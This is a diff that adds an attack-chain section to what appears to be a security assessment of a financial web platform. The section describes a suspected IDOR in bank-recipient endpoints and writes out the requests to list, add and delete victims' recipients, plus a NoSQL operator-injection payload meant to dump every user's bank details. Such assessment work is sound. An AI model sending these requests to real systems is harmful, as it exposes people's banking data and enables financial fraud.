@@ -288,6 +288,62 @@ admin functionality, and craft targeted exploits without any traffic to the targ
 
 ---
 
+## CHAIN 7: Bank Recipient IDOR -> Financial Data Exfil + Account Manipulation (P1/P2)
+
+### Summary
+The bank recipient management endpoints use `activeProfileUsername` as a client-supplied query parameter to scope operations. If the server trusts this parameter instead of deriving the username from the session, any authenticated user can:
+1. List all saved bank recipients of any user (exposes bank account numbers, names, bank codes)
+2. Add rogue bank recipients to a victim's account (social engineering vector)
+3. Delete a victim's legitimate bank recipients (denial of service for withdrawals)
+
+Additionally, the user object exposes `netbankAccountNumber` -- the user's own linked bank account number.
+
+### Attack Flow
+
+Step 1 - List victim's bank recipients:
+```
+GET /api/v0/bank/recipients?activeProfileUsername=victim_username
+-> If IDOR: returns all saved bank recipients with accountName, accountNumber, bankCode
+```
+
+Step 2 - NoSQLi variant (operator injection to bypass username match):
+```
+GET /api/v0/bank/recipients?activeProfileUsername[$ne]=nonexistent
+-> If vulnerable: returns bank recipients across ALL users (mass data exfil)
+```
+
+Step 3 - Add attacker-controlled recipient to victim's account:
+```
+POST /api/v0/bank/recipients?activeProfileUsername=victim_username
+Body: {
+  "type": "instapay",
+  "accountName": "Legit Looking Name",
+  "accountNumber": "ATTACKER_BANK_ACCT",
+  "bankCode": "ATTACKER_BANK"
+}
+-> Victim may accidentally send funds to attacker's recipient
+```
+
+Step 4 - Delete victim's legitimate recipients:
+```
+DELETE /api/v0/bank/recipients/{recipientId}?activeProfileUsername=victim_username
+-> Removes victim's saved bank recipients, disrupting their withdrawals
+```
+
+### Evidence
+- Deobfuscated main chunk (main.5c273a76.chunk.js) confirms endpoint structure
+- ManageContacts/index.js:158 and AddBankRecipient.js:49
+- `activeProfileUsername` is sourced from client state, not session
+- NoSQLi angle: Express qs parser converts `[$ne]` bracket syntax into MongoDB operator objects
+
+### Impact
+Exposure of sensitive banking data (account numbers, names, bank affiliations) for all platform users. Combined with Chain 1 (user enumeration via bridge endpoints), enables targeted financial fraud. The NoSQLi variant could dump all bank recipients in a single request.
+
+### CVSS
+8.1 High (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)
+
+---
+
 ## TESTING PRIORITY
 
 1. CHAIN 1 (Admin bypass) - Test GET /api/v3/bridge/users with regular user token first. This is read-only and immediately confirms/denies the auth bypass hypothesis.
